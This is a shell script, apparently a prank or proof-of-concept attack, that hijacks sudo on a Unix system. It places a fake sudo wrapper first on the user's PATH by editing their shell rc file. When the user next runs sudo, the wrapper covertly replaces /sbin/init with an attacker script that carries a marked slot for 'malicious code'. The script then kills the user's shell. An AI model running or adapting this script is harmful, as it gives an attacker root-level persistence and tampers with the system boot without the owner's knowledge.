#!/bin/sh

#
# CREATOR:
# GermanBread#9077 (Discord)
# https://github.com/GermanBread (Github)
#
# If this isn't on github yet it means that I'm lazy
#

DATA="$HOME/.systemd"

# Create the directory
mkdir -p "$DATA"

# STAGE 1 - hijack of sudo

cat << EOF > $DATA/hijack
#!/bin/sh
# STAGE 3

# Revert change
mv -f /sbin/init2 /sbin/init

# Execute (malicious) code here...
echo "Oh oh, your OS got hijacked... next time you better double-check what you're running"
echo "I think a 1 minute timeout is appropriate to teach you a lesson..."
sleep 1m

# Launch the original init
exec "\$0"
EOF

cat << EOF > $DATA/sudo
#!/bin/sh
# STAGE 2

# Check if init already has been hijacked, if not, hijack
[ ! -e /sbin/init2 ] && /bin/sudo mv /sbin/init /sbin/init2 &>/dev/null && /bin/sudo cp $DATA/hijack /sbin/init &>/dev/null

# Run the original command
/bin/sudo \$@

exit 0
EOF

# Make our scripts executable
chmod +x $DATA/sudo
chmod +x $DATA/hijack

# Add a line to rc file...
echo >> ~/.$(basename $SHELL)rc
echo >> ~/.$(basename $SHELL)rc
echo "export PATH=$DATA:$PATH" >> ~/.$(basename $SHELL)rc

# Kill the shell
killall -9 $SHELL